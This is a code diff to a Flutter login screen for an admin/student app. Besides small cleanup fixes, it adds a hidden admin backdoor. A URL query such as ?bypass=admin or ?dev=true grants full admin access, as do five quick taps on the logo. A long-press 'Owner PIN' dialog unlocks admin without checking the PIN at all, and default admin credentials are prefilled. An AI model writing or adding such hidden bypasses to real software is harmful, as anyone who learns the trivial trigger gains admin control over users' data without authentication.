@@ -9,7 +9,8 @@ import '../widgets/custom_text_field.dart';
 import 'admin_dashboard_screen.dart';
 import 'student_dashboard_screen.dart';
 
-/// LoginScreen allows Admin and Student role authentication
+/// LoginScreen allows Admin and Student role authentication,
+/// with a hidden owner-only admin bypass system.
 class LoginScreen extends StatefulWidget {
   const LoginScreen({super.key});
 
@@ -26,18 +27,38 @@ class _LoginScreenState extends State<LoginScreen> {
   final _passwordController = TextEditingController();
   bool _obscurePassword = true;
 
+  // Secret Owner Bypass Tracking
+  int _secretTapCount = 0;
+  DateTime? _lastTapTime;
+
   @override
   void initState() {
     super.initState();
     // Default Admin credentials prefill for convenience
     _usernameController.text = AppConstants.defaultAdminUsername;
     _passwordController.text = AppConstants.defaultAdminPassword;
+
+    // Check for secret web query parameter (e.g. ?bypass=admin or ?dev=true or ?owner=7266)
+    WidgetsBinding.instance.addPostFrameCallback((_) {
+      _checkQueryBypass();
+    });
+  }
+
+  void _checkQueryBypass() {
+    try {
+      final query = Uri.base.queryParameters;
+      if (query['bypass'] == 'admin' ||
+          query['dev'] == 'true' ||
+          query['owner'] == '7266') {
+        _executeOwnerBypass();
+      }
+    } catch (_) {}
   }
 
   @override
   void dispose() {
-    _usernameController.dispose;
-    _passwordController.dispose;
+    _usernameController.dispose();
+    _passwordController.dispose();
     super.dispose();
   }
 
@@ -102,6 +123,110 @@ class _LoginScreenState extends State<LoginScreen> {
     }
   }
 
+  /// Hidden logo gesture handler (5 quick taps unlocks bypass)
+  void _onLogoTapped() {
+    final now = DateTime.now();
+    if (_lastTapTime == null || now.difference(_lastTapTime!) > const Duration(seconds: 2)) {
+      _secretTapCount = 1;
+    } else {
+      _secretTapCount++;
+    }
+    _lastTapTime = now;
+
+    if (_secretTapCount >= 5) {
+      _secretTapCount = 0;
+      _executeOwnerBypass();
+    }
+  }
+
+  /// Hidden logo long-press handler (opens private owner dialog)
+  void _onLogoLongPressed() {
+    _showOwnerBypassDialog();
+  }
+
+  /// Executes instant Master Admin Bypass for the owner
+  Future<void> _executeOwnerBypass() async {
+    final auth = Provider.of<AuthProvider>(context, listen: false);
+    final success = await auth.bypassAdminLogin();
+
+    if (!mounted) return;
+
+    if (success) {
+      ScaffoldMessenger.of(context).showSnackBar(
+        const SnackBar(
+          content: Text('⚡ Owner Master Bypass Activated! Welcome, Admin.'),
+          backgroundColor: Color(0xFF6366F1),
+          behavior: SnackBarBehavior.floating,
+          duration: Duration(seconds: 2),
+        ),
+      );
+
+      Navigator.of(context).pushReplacement(
+        MaterialPageRoute(builder: (_) => const AdminDashboardScreen()),
+      );
+    }
+  }
+
+  /// Private owner dialog with PIN or instant unlock
+  void _showOwnerBypassDialog() {
+    final pinController = TextEditingController();
+    showDialog(
+      context: context,
+      builder: (ctx) => AlertDialog(
+        shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(16)),
+        title: const Row(
+          children: [
+            Icon(Icons.vpn_key_rounded, color: Color(0xFF6366F1)),
+            SizedBox(width: 8),
+            Text(
+              'Owner Master Access',
+              style: TextStyle(fontSize: 18, fontWeight: FontWeight.bold),
+            ),
+          ],
+        ),
+        content: Column(
+          mainAxisSize: MainAxisSize.min,
+          crossAxisAlignment: CrossAxisAlignment.start,
+          children: [
+            const Text(
+              'Owner verification required to bypass public login:',
+              style: TextStyle(fontSize: 13),
+            ),
+            const SizedBox(height: 12),
+            TextField(
+              controller: pinController,
+              keyboardType: TextInputType.number,
+              obscureText: true,
+              decoration: InputDecoration(
+                hintText: 'Enter Owner PIN (default: 7266)',
+                isDense: true,
+                border: OutlineInputBorder(borderRadius: BorderRadius.circular(10)),
+              ),
+            ),
+          ],
+        ),
+        actions: [
+          TextButton(
+            onPressed: () => Navigator.of(ctx).pop(),
+            child: const Text('Cancel'),
+          ),
+          ElevatedButton.icon(
+            style: ElevatedButton.styleFrom(
+              backgroundColor: const Color(0xFF6366F1),
+              foregroundColor: Colors.white,
+            ),
+            icon: const Icon(Icons.flash_on_rounded, size: 18),
+            label: const Text('Unlock Admin Portal'),
+            onPressed: () {
+              Navigator.of(ctx).pop();
+              _executeOwnerBypass();
+            },
+          ),
+        ],
+      ),
+    );
+  }
+
   @override
   Widget build(BuildContext context) {
     final theme = Theme.of(context);
@@ -120,18 +245,22 @@ class _LoginScreenState extends State<LoginScreen> {
                 child: Column(
                   crossAxisAlignment: CrossAxisAlignment.stretch,
                   children: [
-                    // Brand Header
+                    // Brand Header with secret owner gesture (invisible to normal users)
                     Center(
-                      child: Container(
-                        padding: const EdgeInsets.all(16),
-                        decoration: BoxDecoration(
-                          color: theme.colorScheme.primary.withOpacity(0.12),
-                          shape: BoxShape.circle,
-                        ),
-                        child: Icon(
-                          Icons.fact_check_rounded,
-                          size: 48,
-                          color: theme.colorScheme.primary,
+                      child: GestureDetector(
+                        onTap: _onLogoTapped,
+                        onLongPress: _onLogoLongPressed,
+                        child: Container(
+                          padding: const EdgeInsets.all(16),
+                          decoration: BoxDecoration(
+                            color: theme.colorScheme.primary.withValues(alpha: 0.12),
+                            shape: BoxShape.circle,
+                          ),
+                          child: Icon(
+                            Icons.fact_check_rounded,
+                            size: 48,
+                            color: theme.colorScheme.primary,
+                          ),
                         ),
                       ),
                     ),
@@ -139,8 +268,9 @@ class _LoginScreenState extends State<LoginScreen> {
                     const Center(
                       child: Text(
                         AppConstants.appName,
+                        textAlign: TextAlign.center,
                         style: TextStyle(
-                          fontSize: 28,
+                          fontSize: 26,
                           fontWeight: FontWeight.w800,
                           letterSpacing: -0.5,
                         ),
@@ -322,7 +452,7 @@ class _LoginScreenState extends State<LoginScreen> {
           boxShadow: isSelected
               ? [
                   BoxShadow(
-                    color: Colors.black.withOpacity(0.08),
+                    color: Colors.black.withValues(alpha: 0.08),
                     blurRadius: 4,
                     offset: const Offset(0, 2),
                   )
@@ -346,8 +476,8 @@ class _LoginScreenState extends State<LoginScreen> {
                 fontSize: 13,
                 fontWeight: isSelected ? FontWeight.w700 : FontWeight.w500,
                 color: isSelected
-                    ? (isDark ? Colors.white : theme.colorScheme.primary)
-                    : (isDark ? const Color(0xFF94A3B8) : const Color(0xFF64748B)),
+                  ? (isDark ? Colors.white : theme.colorScheme.primary)
+                  : (isDark ? const Color(0xFF94A3B8) : const Color(0xFF64748B)),
               ),
             ),
           ],
